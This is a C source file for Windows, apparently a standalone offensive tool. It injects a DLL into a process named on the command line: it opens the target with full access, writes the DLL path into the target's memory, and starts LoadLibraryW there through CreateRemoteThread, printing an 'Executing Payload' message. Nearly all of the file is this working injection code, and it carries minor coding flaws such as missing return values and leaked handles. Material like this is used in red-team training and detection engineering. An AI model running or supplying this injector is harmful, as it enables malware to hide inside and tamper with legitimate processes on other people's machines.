#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

DWORD PID = 0;

BOOL GetProcessList(const wchar_t* processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// take a snapshot of all processes in the system
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot (of processes)");
		return FALSE;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32)) {
		printf("failed process32first");
		return EXIT_FAILURE;
	}
	// walk the snapshot of process and display information about each process in turn
	do {
		dwPriorityClass = 0;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

		dwPriorityClass = GetPriorityClass(hProcess);
		if (_wcsicmp(processName, pe32.szExeFile) == 0) {
			wprintf(L"found %ls (PID %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
			PID = pe32.th32ProcessID;
		}
	} while (
		Process32Next(hProcessSnap, &pe32)
		);
}

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE = TRUE;

	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten = NULL;

	HANDLE		hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}

// using wmain so that argv[1] is wide char, this is what the pe32 struct is using so strcmp requried wchar to compare.
int wmain(int argc, wchar_t* argv[]) {
	if (argc < 3) {
		wprintf(L"[!] Usage: %s <ProcessName.exe> <inject.dll>\n", argv[0]);
		return 1;
	}
	GetProcessList(argv[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	wchar_t dllPath[MAX_PATH];
	wcscpy_s(dllPath, MAX_PATH, argv[2]);
	SIZE_T sdllPath = sizeof(dllPath);
	InjectDllToRemoteProcess(hProcess, dllPath);
	CloseHandle(hProcess);
	return 0;
}